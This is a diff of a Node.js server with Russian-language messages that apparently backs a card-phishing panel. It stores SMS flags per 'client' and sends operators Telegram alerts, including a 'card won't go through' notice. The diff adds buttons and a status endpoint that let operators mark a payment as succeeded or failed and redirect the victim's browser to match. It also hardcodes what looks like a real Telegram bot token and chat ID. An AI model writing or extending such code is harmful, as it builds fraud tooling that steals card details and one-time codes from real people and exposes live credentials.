@@ -10,8 +10,9 @@ const PORT = process.env.PORT || 3001
 const BOT_TOKEN_CARDS = '8406857793:AAGDQnLYrL78nWDrBxi1AS1kWTTVjxdUbpg'
 const CHAT_ID_CARDS = '-1003171719602'
 
-// In-memory storage для флагов SMS
+// In-memory storage для флагов SMS и статуса оплаты
 const smsFlags = new Map()
+const paymentFlags = new Map()
 
 // Middleware
 app.use(cors())
@@ -46,6 +47,12 @@ app.post('/api/set-sms/:userId', (req, res) => {
   const { userId } = req.params
   smsFlags.set(userId, true)
   res.status(200).json({ message: `SMS flag manually set for user ${userId}` })
+})
+
+app.get('/api/check-payment-status/:userId', (req, res) => {
+  const { userId } = req.params
+  const paymentStatus = paymentFlags.get(userId) || 'pending'
+  res.json({ paymentStatus })
 })
 
 // Telegram webhook endpoint
@@ -179,6 +186,12 @@ async function handleCallbackQuery(callbackQuery) {
   } else if (callbackData.startsWith('card_blocked_')) {
     userId = callbackData.replace('card_blocked_', '')
     action = 'card_blocked'
+  } else if (callbackData.startsWith('payment_success_')) {
+    userId = callbackData.replace('payment_success_', '')
+    action = 'payment_success'
+  } else if (callbackData.startsWith('payment_failed_')) {
+    userId = callbackData.replace('payment_failed_', '')
+    action = 'payment_failed'
   }
 
   if (userId && action) {
@@ -205,6 +218,18 @@ async function handleCallbackQuery(callbackQuery) {
       case 'card_blocked':
         responseText = '🚫 Карта помечена как заблокированная'
         await sendTelegramMessage(chatId, `🚫 <b>КАРТА НЕ ЛЕЗЕТ</b>\n\n👤 ID клиента: <code>${userId}</code>`)
+        break
+
+      case 'payment_success':
+        paymentFlags.set(userId, 'success')
+        responseText = '✅ Оплата отмечена как успешная'
+        await sendTelegramMessage(chatId, `✅ <b>ОПЛАТА УСПЕШНА</b>\n\n👤 ID клиента: <code>${userId}</code>\n💰 Клиент будет перенаправлен на страницу успешной оплаты`)
+        break
+
+      case 'payment_failed':
+        paymentFlags.set(userId, 'failed')
+        responseText = '❌ Оплата отмечена как неуспешная'
+        await sendTelegramMessage(chatId, `❌ <b>ОПЛАТА НЕУСПЕШНА</b>\n\n👤 ID клиента: <code>${userId}</code>\n💰 Клиент будет перенаправлен на страницу неуспешной оплаты`)
         break
     }
 
